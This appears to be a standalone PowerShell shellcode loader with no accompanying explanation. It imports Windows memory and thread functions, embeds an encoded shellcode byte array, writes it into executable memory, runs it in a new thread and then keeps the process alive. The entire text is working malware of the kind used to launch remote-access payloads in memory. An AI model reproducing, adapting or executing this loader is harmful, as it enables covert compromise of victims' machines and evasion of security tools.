$TOyJ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $TOyJ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd0,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0xbf,0x6a,0xb4,0x96,0x80,0x31,0x7a,0x18,0x83,0xea,0xfc,0x03,0x7a,0x7e,0x56,0x63,0x7c,0x96,0x14,0x8c,0x7d,0x66,0x79,0x04,0x98,0x57,0xb9,0x72,0xe8,0xc7,0x09,0xf0,0xbc,0xeb,0xe2,0x54,0x55,0x78,0x86,0x70,0x5a,0xc9,0x2d,0xa7,0x55,0xca,0x1e,0x9b,0xf4,0x48,0x5d,0xc8,0xd6,0x71,0xae,0x1d,0x16,0xb6,0xd3,0xec,0x4a,0x6f,0x9f,0x43,0x7b,0x04,0xd5,0x5f,0xf0,0x56,0xfb,0xe7,0xe5,0x2e,0xfa,0xc6,0xbb,0x25,0xa5,0xc8,0x3a,0xea,0xdd,0x40,0x25,0xef,0xd8,0x1b,0xde,0xdb,0x97,0x9d,0x36,0x12,0x57,0x31,0x77,0x9b,0xaa,0x4b,0xbf,0x1b,0x55,0x3e,0xc9,0x58,0xe8,0x39,0x0e,0x23,0x36,0xcf,0x95,0x83,0xbd,0x77,0x72,0x32,0x11,0xe1,0xf1,0x38,0xde,0x65,0x5d,0x5c,0xe1,0xaa,0xd5,0x58,0x6a,0x4d,0x3a,0xe9,0x28,0x6a,0x9e,0xb2,0xeb,0x13,0x87,0x1e,0x5d,0x2b,0xd7,0xc1,0x02,0x89,0x93,0xef,0x57,0xa0,0xf9,0x67,0x9b,0x89,0x01,0x77,0xb3,0x9a,0x72,0x45,0x1c,0x31,0x1d,0xe5,0xd5,0x9f,0xda,0x0a,0xcc,0x58,0x74,0xf5,0xef,0x98,0x5c,0x31,0xbb,0xc8,0xf6,0x90,0xc4,0x82,0x06,0x1d,0x11,0x3e,0x02,0x89,0x28,0x9f,0xd7,0xab,0x25,0xe2,0xe7,0x34,0x26,0x6b,0x01,0x1a,0x16,0x3c,0x9e,0xda,0xc6,0xfc,0x4e,0xb2,0x0c,0xf3,0xb1,0xa2,0x2e,0xd9,0xd9,0x48,0xc1,0xb4,0xb2,0xe4,0x78,0x9d,0x49,0x95,0x85,0x0b,0x34,0x95,0x0e,0xb8,0xc8,0x5b,0xe7,0xb5,0xda,0x0b,0x07,0x80,0x81,0x9d,0x18,0x3e,0xaf,0x21,0x8d,0xc5,0x66,0x76,0x39,0xc4,0x5f,0xb0,0xe6,0x37,0x8a,0xcb,0x2f,0xa2,0x75,0xa3,0x4f,0x22,0x76,0x33,0x06,0x28,0x76,0x5b,0xfe,0x08,0x25,0x7e,0x01,0x85,0x59,0xd3,0x94,0x26,0x08,0x80,0x3f,0x4f,0xb6,0xff,0x08,0xd0,0x49,0x2a,0x89,0x2c,0x9c,0x12,0xff,0x5c,0x1c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$pBw=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($pBw.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$pBw,0,0,0);for (;;){Start-sleep 60};